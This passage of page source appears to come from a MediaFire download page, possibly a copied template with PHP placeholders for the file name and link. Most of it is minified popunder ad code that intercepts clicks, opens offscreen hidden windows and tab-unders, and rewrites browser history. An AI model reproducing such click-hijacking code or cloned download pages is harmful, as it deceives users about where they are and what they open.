c.ChromePopMouseDownHandler,!0),c.Storage.SetSessionStorage("InfChromePopEventAttached",!0),c._Top.onbeforeunload=c._Top.onunload=function(d){c.Storage.DeleteSessionStorage("InfChromePopEventAttached")})}}catch(d){e.ConsoleLog(d)}},_getTriggerEvent:function(){for(var a=this._getPopOpenMode(),b=[this._popOpenModes.pdfAndFalseTab,this._popOpenModes.doublePop,this._popOpenModes.doublePdf,this._popOpenModes.doublePdfDoublePop,this._popOpenModes.tabUnder,this._popOpenModes.postMessage],c=0;c<b.length;c++)if(b[c]=== a)return"mousedown";return"click"}},EdgePopunder:{_media:null,_popMediaUrl:null,_abortPop:!1,supported:function(a,b,c){return"Edge"===a.name&&"Windows"===b.name&&this._isPopunder(c)&&!this._isTracking(c)&&!this._isSameTab(c)},_isPopunder:function(a){var b=e;return b.IsFastPop&&b.PopSettings.IsPopunder||!b.IsFastPop&&0===a.Settings.PopType},_isTracking:function(a){var b=e;return b.IsFastPop?b.PopSettings.IsTracking:a.Settings.IsTracking},_isSameTab:function(a){var b=e;a=b.IsFastPop?b.PopSettings.SameTabAdSettings: a.Settings.SameTabAdSettings;return null!=a&&a.Windows&&a.Edge&&(0==a.AdblockOnly||b.IsAdblockRequest)},init:function(a){this._media=a;var b=e;b.PopMedia=a;a=b.IsFastPop&&!b.AbortFastPop?b.BasePopunder.getFastPopUrl():b.FetchMediaUrl(a);this._popMediaUrl=b.BasePopunder.buildUrl(a,b.Enums.SelectedPopType.PopUnder);var c=this;b._Top.document.addEventListener("mousedown",function(g){c._mouseDownHandler(g)},!0);b._Top.document.addEventListener("click",function(g){c._clickHandler(g)},!0)},_mouseDownHandler:function(a){e.BasePopunder.mouseDownHandler(a, this._media)&&this._execute(a);return!0},_clickHandler:function(a){e.BasePopunder.shouldHandleEvent(this._media,!1)&&!this._abortPop&&(a.preventDefault(),a.stopImmediatePropagation(),a.stopPropagation());return!0},_execute:function(a){var b=e;if(b.BasePopunder.execute(a,"mousedown",!0)){var c=1024,g=768,h=!1;if(!b.IsFastPop||b.AbortFastPop)h=this._media.ZoneAcceptsFullscreenPageunder&&this._media.MediaAllowsFullscreenPageunder,c=320>this._media.Settings.Width?320:h?b._Top.window.screen.availWidth: this._media.Settings.Width,g=159>this._media.Settings.Height?160:h?b._Top.screen.availHeight:this._media.Settings.Height+1;var l=h?0:b.GetWindowLeft()+b.GetWindowWidth()/2-c/2;c="scrollbars=1,location=1,statusbar=1,menubar=0,resizable=1,top="+(h?0:b.GetWindowTop()+b.GetWindowHeight()/2-g/2)+",left="+l+",width="+c+",height="+g+",index=0,total=1";var d=window.open("about:blank",b.BasePopunder.getWindowName(),c),f=this,k=0,m=setInterval(function(){k++;2<k||b._Top.document.hasFocus()?(clearInterval(m), d.location.href=f._popMediaUrl,b.BasePopunder.postWindowPop(),b.BasePopunder.triggerClick(a.target||a.srcElement)):b._Top.focus()},400)}else this._abortPop=!0}},LogZoneFilter:function(a){var b=this;return function(c,g,h){"undefined"===typeof a||null==a?b.ClientProfilingLog.WriteFilterLog({id:"-1",name:"UNKNOWN",type:"Zone"},c,g,h):b.ClientProfilingLog.WriteFilterLog({id:a.Id,name:a.Name,type:"Zone"},c,g,h)}},ClientProfilingLog:{_logItems:[],WriteFilterLog:function(a,b,c,g){this._logItems.push({type:"filter", data:{message:g,passed:c,name:b,target:a}})},GetItems:function(){return this._logItems}},IsTagTest:function(){try{return!0===window.top.__infinity_tag_test}catch(a){}return!1}};(function(a){function b(d){if("object"!==typeof d&&"function"!==typeof d)throw new TypeError("Object prototype may only be an Object: "+d);if("function"!==typeof Object.create){var f=function(){};f.prototype=d;return new f}return Object.create(d)}function c(d,f){d.prototype=b(f.prototype);d.prototype.constructor=d}Array.prototype.findIndexOfNth|| Object.defineProperty(Array.prototype,"findIndexOfNth",{value:function(d,f){if(1>f)throw"N must be greater than 0";for(var k=0;k<this.length;){if(d.call(window,this[k],k,this)&&(f--,0===f))return k;k++}return-1}});Array.prototype.forEach||(Array.prototype.forEach=function(d){var f,k;if(null==this)throw new TypeError("this is null or not defined");var m=Object(this),n=m.length>>>0;if("function"!==typeof d)throw new TypeError(d+" is not a function");1<arguments.length&&(f=arguments[1]);for(k=0;k<n;){if(k in m){var r=m[k];d.call(f,r,k,m)}k++}});Array.prototype.filter||(Array.prototype.filter=function(d){if(void 0===this||null===this)throw new TypeError;var f=Object(this),k=f.length>>>0;if("function"!==typeof d)throw new TypeError;for(var m=[],n=2<=arguments.length?arguments[1]:void 0,r=0;r<k;r++)if(r in f){var t=f[r];d.call(n,t,r,f)&&m.push(t)}return m});Array.prototype.find||Object.defineProperty(Array.prototype,"find",{value:function(d,f){if(null==this)throw new TypeError('"this" is null or not defined'); var k=Object(this),m=k.length>>>0;if("function"!==typeof d)throw new TypeError("predicate must be a function");for(var n=0;n<m;){var r=k[n];if(d.call(f,r,n,k))return r;n++}}});Array.prototype.map||(Array.prototype.map=function(d){var f,k;if(null==this)throw new TypeError("this is null or not defined");var m=Object(this),n=m.length>>>0;if("function"!==typeof d)throw new TypeError(d+" is not a function");1<arguments.length&&(f=arguments[1]);var r=Array(n);for(k=0;k<n;){if(k in m){var t=m[k];t=d.call(f, t,k,m);r[k]=t}k++}return r});Array.prototype.findIndex||(Array.prototype.findIndex=function(d,f){if(null==this)throw new TypeError("Array.prototype.findIndex called on null or undefined");if("function"!==typeof d)throw new TypeError("predicate must be a function");for(var k=Object(this),m=k.length>>>0,n,r=0;r<m;r++)if(n=k[r],d.call(f,n,r,k))return r;return-1});Array.prototype.reduce||(Array.prototype.reduce=function(d){if(null==this)throw new TypeError("Array.prototype.reduce called on null or undefined"); if("function"!==typeof d)throw new TypeError(d+" is not a function");var f=Object(this),k=f.length>>>0,m=0;if(2<=arguments.length)var n=arguments[1];else{for(;m<k&&!(m in f);)m++;if(m>=k)throw new TypeError("Reduce of empty array with no initial value");n=f[m++]}for(;m<k;m++)m in f&&(n=d(n,f[m],m,f));return n});Function.prototype.bind||(Function.prototype.bind=function(d){if("function"!==typeof this)throw new TypeError("Function.prototype.bind - what is trying to be bound is not callable");var f= Array.prototype.slice.call(arguments,1),k=this,m=function(){},n=function(){return k.apply(this instanceof m?this:d,f.concat(Array.prototype.slice.call(arguments)))};this.prototype&&(m.prototype=this.prototype);n.prototype=new m;return n});Array.from||(Array.from=function(){var d=Object.prototype.toString,f=function(m){return"function"===typeof m||"[object Function]"===d.call(m)},k=Math.pow(2,53)-1;return function(m){var n=Object(m);if(null==m)throw new TypeError("Array.from requires an array-like object - not null or undefined"); var r=1<arguments.length?arguments[1]:void 0,t;if("undefined"!==typeof r){if(!f(r))throw new TypeError("Array.from: when provided, the second argument must be a function");2<arguments.length&&(t=arguments[2])}var u=Number(n.length);u=isNaN(u)?0:0!==u&&isFinite(u)?(0<u?1:-1)*Math.floor(Math.abs(u)):u;u=Math.min(Math.max(u,0),k);for(var x=f(this)?Object(new this(u)):Array(u),z=0,v;z<u;)v=n[z],x[z]=r?"undefined"===typeof t?r(v,z):r.call(t,v,z):v,z+=1;x.length=u;return x}}());var g=function(){function d(){} d.VideoAudioMode={audio:0,audioOnMouseOver:1,muted:2};d.OnClickVideoAdUnitMode={ReadMore:0,Scroll:1};d.ViewProgress={firstQuartile:1,midpoint:2,thirdQuartile:3,complete:4};d.MediaSourceType={Url:1,Image:2,Script:3,Html:4,Video:5,VideoTag:6,OnClickIFrame:7,HeaderBidding:8,Native:9};d.MediaSourceTypesFlags={None:0,Url:1,Image:2,Script:4,Html:8,Video:16,VideoTag:32,OnClickIFrame:64,HeaderBidding:128,Native:256};d.TrackingEventType={adFill:1,adView:2,infinityVolume:3,partnerVolume:4,headerBiddingVolume:5, videoAdPlayError:6};d.AdFillCheckStatus={skipped:1,failed:2,success:3};d.chromePopApproach={notification:0,notificationEx:1,tabUnder:2,tabOver:3,doublePop:4,hidden:5,mixed:6};d.RelativePlacementType={Inside:0,Before:1,After:2};d.CssTransitionTimingFunction={Linear:0,Ease:1,EaseIn:2,EaseOut:3,EaseInOut:4};d.VideoButtonDisplayMode={always:0,onHover:1,never:2};d.RelativeAlignment={Left:0,Right:1,Over:2};return d}();(function(){function d(){this._handlers=[];this._triggered=!1}d.prototype.addHandler= function(f,k){this._handlers.push({handler:f,callContext:k})};d.prototype.removeHandler=function(f){if(void 0===f)this.removeAllHandlers();else{var k=this._handlers.findIndex(function(m){return m.handler===f});-1!==k&&this._handlers.splice(k,1)}};d.prototype.getTriggered=function(){return this._triggered};d.prototype.removeAllHandlers=function(){this._handlers=[]};d.prototype.trigger=function(f){for(var k=0;k<this._handlers.length;k++)this._handlers[k].handler.call(this._handlers[k].callContext|| this,f);this._triggered=!0};d.prototype.triggerOnce=function(f){this._triggered||this.trigger(f)};return d})();(function(){function d(f,k){this._name=f;this._enableSendToServer=k.enableSendToServer?!0:!1;this._level=k.level||"Info"}d.prototype.getName=function(){return this._name};d.prototype.getLevel=function(){return this._level};d.prototype.info=function(f){"Info"===this._level&&this._writeLog(this._name+" [INFO]: "+f)};d.prototype.dump=function(f,k){function m(r,t){return t&&"string"===typeof t&& 100<t.length?t.substr(0,100)+"...":t}var n=this;"Info"===this._level&&(this.info(f),this._groupOutput(function(){n._writeLog(JSON.stringify(k,m,4))}))};d.prototype.error=function(f){"Info"!==this._level&&"Error"!==this._level||this._writeError(this._name+" [ERROR]: "+f)};d.prototype._groupOutput=function(f){console.group?(console.group(),f(),console.groupEnd()):f()};d.prototype._writeError=function(f){console.error?console.error(f):(console.log(f),console.trace&&console.trace());this._enableSendToServer&& this._sendToServer(f)};d.prototype._writeLog=function(f){console.log(f);this._enableSendToServer&&this._sendToServer(f)};d.prototype._sendToServer=function(f){var k=new XMLHttpRequest;k.open("POST","https://infinity.pub.com/log.aspx?msg="+encodeURIComponent(f));k.send("")};return d})();(function(){function d(f){for(var k=[],m=1;m<arguments.length;m++)k[m-1]=arguments[m];this._value=f;this._fallbackValues=[];null!=k&&(this._fallbackValues=k)}d.prototype.addFallback=function(f){this._fallbackValues.push(f)}; d.prototype.resolve=function(){return null==this._value?this._fallbackValues.find(function(f){return null!=f}):this._value};return d})();(function(){function d(){}d.isPlaying=function(f){return 0<f.currentTime&&!f.paused&&!f.ended};return d})();(function(){function d(){}d.isChildOf=function(f,k){for(var m=f;null!=m;){if(m===k)return!0;m=m.parentElement}return!1};return d})();var h=function(d,f){this._options=d;this._lotame=f};h.prototype={trackingResponseBuilderTransform:function(d){return this._options.DFPImpressionUrl+ this._options.InfinityHost+d},redirectResponseBuilderTransform:function(d,f,k){var m=this._getRedirectHostUrl(f);1==f.Redirect&&(m=m.replace("https://","https://"));var n="undefined"!=typeof f.MediaSettings?f.MediaSettings:f.Settings;d=this._options.IsAdblockRequest?"/"+(f.MediaSegmentId?f.MediaSegmentId:"null")+"/"+(f.TempMediaId?f.TempMediaId:"null")+"/"+(f.PassBackId?f.PassBackId:"null")+"/"+(f.DataContextId?f.DataContextId:"null")+"/"+(f.VolumeMetricId?f.VolumeMetricId:"null")+"/"+this._options.IsAdblockRequest+ "/"+screen.width+"x"+screen.height+"/"+(f.TimeZoneOffset?f.TimeZoneOffset:"null")+"/"+("undefined"!=typeof f.IsDSTActive&&null!=f.IsDSTActive?f.IsDSTActive:"null")+"/null"+("PopUnder"==f.MediaType?"/SelectedPopTypePlaceholder":"/null")+"/"+(encodeURIComponent(this._options.GetKeywords())?encodeURIComponent(this._options.GetKeywords()):"null")+"/"+n.Width+"/"+n.Height+"/redir.a2b":d+"&abr="+this._options.IsAdblockRequest+"&res="+screen.width+"x"+screen.height;if(!0===k&&1024>n.Width){if(void 0!=this._options.DFPImpressionUrl&& ""!=this._options.DFPImpressionUrl)return f="/Bridge/Index?width="+n.Width+"&height="+n.Height+"&url="+encodeURIComponent(d),this._options.DFPImpressionUrl+m+f;f="/Bridge/Index?width="+n.Width+"&height="+n.Height+"&url="+encodeURIComponent(d);return m+f}"Link"===f.MediaType&&!0===n.PassParams&&0<this._options.PassParams.length&&(k=d+"&"+this._options.PassParams,2048>=k.length&&(d=k),d=this._options.DFPImpressionUrl+d);"Link"!==f.MediaType||f.MediaSourceType!=g.MediaSourceType.Video&&f.MediaSourceType!= g.MediaSourceType.VideoTag||(d="/Bridge/Index?width="+n.Width+"&height="+n.Height+"&url="+encodeURIComponent(d));this._lotame&&this._lotame.PlaceImpressionPixel(f);return void 0!==this._options.EncodeUrl&&this._options.EncodeUrl?(m=m.replace("https://","").replace("https://","").replace("https://",""),this._options.DFPImpressionUrl+"https://"+window.getUri(m+d)):this._options.DFPImpressionUrl+m+d},_getRedirectHostUrl:function(d){return this._options.IsAdblockRequest||null==d||null==d.RedirectHostUrl? this._options.InfinityHost:d.RedirectHostUrl}};var l=function(d,f,k,m,n){this._zoneResult=d;this._urlTransforms=f;this._engineHost=k;this._clientInfo=m;this._createTestClickUrl=n;f=this._apply.bind(this);d.AdItems.forEach(f)};l.prototype={getAdUrl:function(d){function f(m,n){for(var r in n)n.hasOwnProperty(r)&&(m[r]=n[r]);return m}if(d.RedirectUrlTransform){var k=f(f({},this._zoneResult),d);if("function"===typeof this._urlTransforms[d.RedirectUrlTransform])return this._urlTransforms[d.RedirectUrlTransform](d.RedirectUrl, k,!1)}return d.RedirectUrl},getClickTrackingUrl:function(d){if(this._createTestClickUrl)return this._createTestClickUrl(d);d=["rand="+Math.floor(89999999*Math.random()+1E7),"res="+this._clientInfo.getScreenWidth()+"x"+this._clientInfo.getScreenHeight(),"dcid="+(this._zoneResult.DataContextId?this._zoneResult.DataContextId:""),"v="+d.VolumeMetric];return this._engineHost+"/clicktag.engine?"+d.join("&")},_apply:function(d){var f=this,k;for(k in l.prototype)if("apply"!==k){if("undefined"!==typeof d[k])throw"Cannot extend ad item as member named '"+ k+"' is already defined";(function(m){d[m]=function(){var n=[].slice.call(arguments);n.splice(0,0,this);return f[m].apply(f,n)}})(k)}}};a.UrlTransforms=h;a.AdItemExtensions=l;a.Client=function(){var d=e.UaParser;this._userAgent=d.getUA();this._os=d.getOS();this._browser=d.getBrowser()};a.Client.prototype={isFacebookApp:function(){return-1<this._userAgent.indexOf("FBAN/FBIOS")||-1<this._userAgent.indexOf("FB_IAB/FB4A")||-1<this._userAgent.indexOf("FBAV")},isMacOS:function(){return"Mac OS"===this._os.name}, isChromeBrowser:function(){return"Chrome"===_browser.current.name},getBrowserMajorVersion:function(){return parseInt(browser.major)}};a.PopWindow=function(){this._url="about:blank";this._successCallback=null;this._y=this._x=0;this._height=this._width=1;this._topWin=e._Top;this._topDoc=this._topWin.document};a.PopWindow.prototype={getEventType:function(){return"click"},getRespectsSize:function(){return!0},isSupported:function(d){return!0},canShow:function(d){return!0},setOnSuccessCallback:function(d){this._successCallback= d},setUrl:function(d){throw"Call is not permitted on abstract PopWindow class";},setLocation:function(d,f){this._x=d;this._y=f},setSize:function(d,f){this._width=d;this._height=f},getCompatibleDisplayTargetingType:function(){return null},show:function(d){throw"Call is not permitted on abstract PopWindow class";},getTypeName:function(){throw"Call is not permitted on abstract PopWindow class";},_getRandomName:function(){return Math.floor(1E3*Math.random()+1).toString()},_getWinOptions:function(){return"directories=0,toolbar=0,scrollbars=1,location=0,statusbar=0,menubar=0,resizable=1,width="+ this._width+",height="+this._height+",screenX="+this._x+",screenY="+this._y+"index=0,total=1"}};a.PopUnderViaPostMessage=function(){a.PopWindow.call(this);this._messageNamespace=Math.random().toString();this._initialized=!1;try{var d=this;window.addEventListener("message",function(f){d._handleMessage(f)});this._initialized=!0}catch(f){}};c(a.PopUnderViaPostMessage,a.PopWindow);a.PopUnderViaPostMessage.prototype.getEventType=function(){return"mousedown"};a.PopUnderViaPostMessage.prototype.isSupported= function(d){return this._initialized&&d.isChromeBrowser()&&64<=d.getBrowserMajorVersion()};a.PopUnderViaPostMessage.prototype.setUrl=function(d){this._url=a.BasePopunder.buildUrl(d,a.Enums.SelectedPopType.PopUnder)};a.PopUnderViaPostMessage.prototype.getCompatibleDisplayTargetingType=function(){return e.Enums.PopUnderDisplayTargetingType.Standard};a.PopUnderViaPostMessage.prototype.getTypeName=function(){return"PopUnderViaPostMessage"};a.PopUnderViaPostMessage.prototype._handleMessage=function(d){0=== d.data.indexOf(this._messageNamespace)&&d.origin===window.location.origin&&(d=d.data.substr(this._messageNamespace.length+1),"pop"===d&&this._openPop(),"stub"===d&&this._openStub())};a.PopUnderViaPostMessage.prototype._openPop=function(){var d=this._getRandomName(),f=this._getWinOptions();window.open(this._url,d,f);this._successCallback&&this._successCallback()};a.PopUnderViaPostMessage.prototype._openStub=function(){window.open("about:blank","_blank","").close()};a.PopUnderViaPostMessage.prototype.show= function(){window.postMessage(this._messageNamespace+".pop",window.location.origin);window.postMessage(this._messageNamespace+".stub",window.location.origin)};a.DelayedPopUnder=function(d){a.PopWindow.call(this);this._waitSecondsToLoadMedia=d.waitSecondsToLoadMedia;this._waitForParentToClose=null!=d.waitForParentToClose?d.waitForParentToClose:!0;this._waitForParentToFocus=null!=d.waitForParentToFocus?d.waitForParentToFocus:!0};c(a.DelayedPopUnder,a.PopWindow);a.DelayedPopUnder.prototype.setUrl=function(d){this._url= a.BasePopunder.buildUrl(d,a.Enums.SelectedPopType.PopUnder)};a.DelayedPopUnder.prototype.isSupported=function(d){return!0};a.DelayedPopUnder.prototype._getHiddenWindowOptions=function(){return"directories=0,toolbar=0,scrollbars=1,location=0,statusbar=0,menubar=0,resizable=1,width=1,height=1,screenX=19999,screenY=19999"};a.DelayedPopUnder.prototype._getHiddenPopHtml=function(){var d=(new a.Client).isMacOS()?-70:0;return"<!DOCTYPE HTML><html><head><script> (function() { window.resizeTo(0, 0 ); window.moveTo(9999, 9999); })(); \x3c/script><script>window.openerExists = function(){return window.opener != null;};window.openerHasFocus = function(){return window.opener && window.opener.document && window.opener.document.hasFocus && window.opener.document.hasFocus(); };window.isExpanded = function() { return window.outerWidth > 200 && window.outerHeight > 100; }; function showUpPop(){setTimeout(function(){var popWidth = "+ (this._width+" + window.outerWidth - window.innerWidth;var popHeight = "+this._height+" + window.outerHeight + "+d+";window.moveTo("+this._x+", "+this._y+");window.resizeTo(popWidth, popHeight);document.location.replace('"+this._url+"');}, "+1E3*this._waitSecondsToLoadMedia+");}")+(this._waitForParentToClose||this._waitForParentToFocus?"var poll = setInterval(function(){if (window.isExpanded() || "+this._waitForParentToClose.toString()+" && !window.openerExists() || "+this._waitForParentToFocus.toString()+ " && window.openerHasFocus()){clearInterval(poll);showUpPop();}}, 200);":"showUpPop();")+"\x3c/script></head><body></body></html>"};a.DelayedPopUnder.prototype.show=function(d){e.WinUtil.openWithContent(this._getHiddenPopHtml(),this._getRandomName(),this._getHiddenWindowOptions());this._successCallback&&this._successCallback()};a.DelayedPopUnder.prototype.getCompatibleDisplayTargetingType=function(){return e.Enums.PopUnderDisplayTargetingType.Standard};a.DelayedPopUnder.prototype.getTypeName=function(){return"DelayedPopUnder"}; a.PopOver=function(){a.PopWindow.call(this)};c(a.PopOver,a.PopWindow);a.PopOver.prototype.setUrl=function(d){this._url=a.BasePopunder.buildUrl(d,a.Enums.SelectedPopType.PopOver)};a.PopOver.prototype.show=function(){var d=this._getRandomName(),f=this._getWinOptions();window.open(this._url,d,f);this._successCallback&&this._successCallback()};a.PopOver.prototype.getCompatibleDisplayTargetingType=function(){return e.Enums.PopUnderDisplayTargetingType.Standard};a.PopOver.prototype.getTypeName=function(){return"PopOver"}; a.ExternalSameTab=function(d){if("function"!==typeof d)throw"Argument is invalid. Function expected";a.PopWindow.call(this);this._externalShowFunc=d};c(a.ExternalSameTab,a.PopWindow);a.ExternalSameTab.prototype.setUrl=function(d){this._url=a.BasePopunder.buildUrl(d,a.Enums.SelectedPopType.TabUnder)};a.ExternalSameTab.prototype.getRespectsSize=function(){return!1};a.ExternalSameTab.prototype.isSupported=function(d){return!d.isFacebookApp()};a.ExternalSameTab.prototype.show=function(d){this._externalShowFunc(d); this._successCallback&&this._successCallback()};a.ExternalSameTab.prototype.getCompatibleDisplayTargetingType=function(){return e.Enums.PopUnderDisplayTargetingType.Tab};a.ExternalSameTab.prototype.getTypeName=function(){return"ExternalSameTab"};a.SameTab=function(d){a.PopWindow.call(this);this._clickAnywhere=d.clickAnywhere};c(a.SameTab,a.PopWindow);a.SameTab.prototype.setUrl=function(d){this._url=a.BasePopunder.buildUrl(d,a.Enums.SelectedPopType.TabUnder)};a.SameTab.prototype.getRespectsSize=function(){return!1}; a.SameTab.prototype.isSupported=function(d){return!d.isFacebookApp()};a.SameTab.prototype.canShow=function(d){if(this._clickAnywhere)return!0;d=d.target||d.srcElement;"a"!==d.tagName.toLowerCase()&&(d=e.GetParentLink(d));return"a"===d.tagName.toLowerCase()&&null!=this._extractUrl(d)};a.SameTab.prototype._extractUrl=function(d){var f=/#$/,k=d.getAttribute("href");return 0!==k.lastIndexOf("javascript:",0)&&"#"!==k?(d=d.href.replace(f,""),0==d.length?null:d):null};a.SameTab.prototype._targetBlankTriggered= function(d){return d?e.Storage.SetSessionStorage("InfSTATargetBlank","true"):e.Storage.SetLocalStorage("InfSTATargetBlank","true")};a.SameTab.prototype._isTargetBlankTriggered=function(d){return d?e.Storage.GetSessionStorage("InfSTATargetBlank"):e.Storage.GetLocalStorage("InfSTATargetBlank")};a.SameTab.prototype._resetTargetBlankTrigger=function(d){return d?e.Storage.DeleteSessionStorage("InfSTATargetBlank"):e.Storage.DeleteLocalStorage("InfSTATargetBlank")};a.SameTab.prototype._getUrlToReOpen=function(d, f){if("a"===d.tagName.toLowerCase()){if("_blank"===d.getAttribute("target")&&"true"!==this._isTargetBlankTriggered())return this._targetBlankTriggered(),f;var k=this._extractUrl(d);this._resetTargetBlankTrigger();return null==k?this._topDoc.location.href:k}return this._topDoc.location.href};a.SameTab.prototype.show=function(d){if(!this.canShow(d))throw"Attempt to show window that cannot be shown for current event";d.preventDefault();var f=this._topDoc.location.href;e.TabHistoryRecorder(f,e.TabHistoryStorageName); var k="inftabwindow_"+this._getRandomName();d=d.target||d.srcElement;"a"!==d.tagName.toLowerCase()&&(d=e.GetParentLink(d));var m=this._getUrlToReOpen(d,f);try{var n=window.open(f,k);n.history.replaceState({previous:f},null,f);n.onpageshow=function(r){r.persisted&&n.location.reload()};n.addEventListener("popstate",function(r){n.location=r.state.previous});n.location=m}catch(r){n=window.open(m,k)}n.focus();d.setAttribute("data-tabunder",!0);this._successCallback&&this._successCallback();this._topWin.location.href= this._url};a.SameTab.prototype.getCompatibleDisplayTargetingType=function(){return e.Enums.PopUnderDisplayTargetingType.Tab};a.SameTab.prototype.getTypeName=function(){return"SameTab"};a.TabOver=function(){a.PopWindow.call(this)};c(a.TabOver,a.PopWindow);a.TabOver.prototype.setUrl=function(d){this._url=a.BasePopunder.buildUrl(d,a.Enums.SelectedPopType.TabOver)};a.TabOver.prototype.getRespectsSize=function(){return!1};a.TabOver.prototype.show=function(){var d=this._topDoc.createElement("a");d.setAttribute("data-tabunder", !0);d.href=this._url;d.target="inftabwindow_"+this._getRandomName();this._topDoc.body.appendChild(d);this._successCallback&&this._successCallback();var f=this._topDoc.createEvent("MouseEvents");f.initMouseEvent("click",!0,!0,this._topWin,0,0,0,0,0,!0,!1,!1,!0,0,null);d.dispatchEvent(f)};a.TabOver.prototype.getCompatibleDisplayTargetingType=function(){return e.Enums.PopUnderDisplayTargetingType.Tab};a.TabOver.prototype.getTypeName=function(){return"TabOver"};a.RandomEnumerator=function(d){this._elements= d.slice()};a.RandomEnumerator.prototype={popNext:function(){if(0!==this._elements.length){var d=1===this._elements.length?0:this._getRandomInt(0,this._elements.length),f=this._elements[d];this._elements.splice(d,1);return f}},_getRandomInt:function(d,f){d=Math.ceil(d);f=Math.floor(f);return Math.floor(Math.random()*(f-d))+d}};a.WinUtil={openWithContent:function(d,f,k){f=window.open("about:blank",f,k);if(null==f)return null;k=f.document;k.open();k.writeln(d);k.close();return f}}})(e);e.Fingerprint= 123;String.format||(String.format=function(a){var b=Array.prototype.slice.call(arguments,1);return a.replace(/{(\d+)}/g,function(c,g){return"undefined"!=typeof b[g]?b[g]:c})});e.Init();void 0===e._Top.g367CB268B1094004A3689751E7AC568F&&(e._Top.g367CB268B1094004A3689751E7AC568F={},e._Top.g367CB268B1094004A3689751E7AC568F=e);void 0===e._Top.g367CB268B1094004A3689751E7AC568F.ExternalChromePop&&(e._Top.g367CB268B1094004A3689751E7AC568F.ExternalChromePop=e.ExternalChromePop);true&&"function"== typeof rAb&&(!false||e.IsAdblockRequest)&&rAb()}}()})})();
</script> <div id="cookie-accept-footer" class="CookieAcceptance">
<p>MediaFire uses cookies to provide you with a personalized browsing experience. By continuing to use this site, you agree to our Privacy Policy..</p>
<div class="CookieAcceptance-buttons">
<a href="#" class="CookieAcceptance-close" onclick="acceptCookieFooter(); return false;">
<span>Dismiss</span>
</a>
<a href="#" class="CookieAcceptance-accept" onclick="acceptCookieFooter(); return false;">
I Accept
</a>
</div>
</div>
<script type="text/javascript">
    function acceptCookieFooter() {
        var el = document.getElementById('cookie-accept-footer');
        if (el) el.style.display = 'none';
        document.cookie = "accept-cookies=1;domain=.mediafire.com;path=/;max-age=31536000";
    }
</script>
<div id="status">
<div id="status-message"></div>
<div id="status-close">Click to dismiss this message</div>
</div>
<iframe name="iframe_worker" id="iframe_worker" src="" style="display:none;height:0;width:0;"></iframe>
<script type="text/javascript">(function(){
(function() {
  // Options
  var optThemeClass = "defaultTheme";

  // Interface
  var uiButtonLogout = document.getElementById('logout');
  var uiStatusContainer = document.getElementById('status');
  var uiStatusMessage = document.getElementById('status-message');
  var uiIframeWorker = document.getElementById('iframe_worker');
  var uiDropdowns = document.getElementsByClassName('dropdown');
  var uiGoogleLang = document.getElementsByClassName('goog-te-combo');

  // State
  var stateTimerStatus;

  // Legacy
  try {document.domain = 'mediafire.com'} catch(e) {};
  window.reloadPage = function() { window.location.reload(); };
  window.noop = function() {};
  window.ClearStatusMessages = reloadPage;
  window.setCookieSeconds = noop;
  window.Re = reloadPage;
  window.aU = noop;

  // Globals
  window.setCookie = function(name, value, expireDays) {
    var date = new Date();
    date.setDate(date.getDate() + expireDays);
    document.cookie = name + "=" + escape(value)
      + ((expireDays == null) ? "" : ";expires="
      + date.toGMTString()) + ";path=/";
  }

  window.getCookie = function(name) {
    if (document.cookie.length > 0) {
      var start = document.cookie.indexOf(name + "=");
      if (start !== -1) {
        start = start + name.length + 1;
        var end = document.cookie.indexOf(";",start);
        if (end === -1) end = document.cookie.length;
        return unescape(document.cookie.substring(start, end));
      }
    }
    return '';
  }

  window.loadHotjar = function() {
    (function(h,o,t,j,a,r){
      h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
      h._hjSettings={hjid:1232118,hjsv:6};
      a=o.getElementsByTagName('head')[0];
      r=o.createElement('script');r.async=1;
      r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
      a.appendChild(r);
    })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv=');
  }

  window.registerGoogleLang = function() {
    var updateLanguage = function(e) {
      document.body.className = (e.target.value || 'en') + ' ' + optThemeClass;
    };
    if (uiGoogleLang) {
      for (var i = 0; i < uiGoogleLang.length; i++) {
        uiGoogleLang[i].onchange = updateLanguage;
      }
    }
  }

  // Locals
  function clickOutside() {
    document.removeEventListener('click', clickOutside);
    if (uiDropdowns) {
      for (var i = 0; i < uiDropdowns.length; i++) {
        uiDropdowns[i].classList.remove('show_dropdown');
      }
    }
  }

  function toggleDropdown(dropdown) {
    return function(e) {
      if (dropdown.classList.contains('show_dropdown')) {
        dropdown.classList.remove('show_dropdown');
      } else {
        e.preventDefault();
        dropdown.classList.add('show_dropdown');
        setTimeout(function() {
          document.addEventListener('click', clickOutside);
        }, 0);
      }
    };
  }

  // Events
  if (uiButtonLogout) {
    uiButtonLogout.onclick = function(e) {
      e.preventDefault();
      if (uiIframeWorker)
        uiIframeWorker.src = e.target.href;
      return false;
    }
  }

  if (uiDropdowns) {
    for (var i = 0; i < uiDropdowns.length; i++) {
      uiDropdowns[i].onclick = toggleDropdown(uiDropdowns[i]);
    }
  }

  if (uiStatusContainer) {
    window.closeStatusMessage = function() {
      if (stateTimerStatus) {
        clearTimeout(stateTimerStatus);
        stateTimerStatus = null;
      }
      uiStatusMessage.innerText = '';
      uiStatusMessage.textContent = '';
      uiStatusContainer.style.display = 'none';
    }

    window.showStatusMessage = function(message) {
      uiStatusMessage.innerText = message;
      uiStatusMessage.textContent = message;
      uiStatusContainer.style.display = 'block';
      setTimeout(closeStatusMessage, 3500);
    }

    uiStatusContainer.onclick = function(e) {
      e.preventDefault();
      closeStatusMessage();
    };
  }

  // Keyboard focus styling
  try {
    document.addEventListener('keydown', function(e) {
      if (e.keyCode === 9) {
        document.body.classList.add('show-focus-outlines');
      }
    });

    document.addEventListener('click', function(e) {
      document.body.classList.remove('show-focus-outlines');
    });
  } catch (e) {}
})();

(function() {
  // Options
  var optFileKey = "b7unej8p3tysm28";
  var optFileName = "<?php echo $namafile; ?>.mp4";
  var optFileURL = "<?php echo $linkweb ?>";
  var optLoggedIn = "false" === "true";
  var optReportTurboDL = "false" === "true";
  var optSecurityToken = "1652556174.48dd29fd50ea7010e97058a464a3ac15b097b645e31e53ab868e72fb458e0f66";
  var optJsDirectLink = "false" === "true";

  // Elements
  var elWrapperAd = document.getElementById('non-dl-content');
  var elWrapperShare = document.getElementById('share');
  var elCloseShare = document.getElementById('share-close');
  var elIframeShare = document.getElementById('share-iframe');
  var elShare = document.getElementById('shareButton');
  var elShareMobile = document.getElementById('shareButtonMobile');
  var elSave = document.getElementById('saveButton');
  var elSaveMobile = document.getElementById('saveButtonMobile');
  var elSaveParallel = document.getElementById('saveButtonParallel');
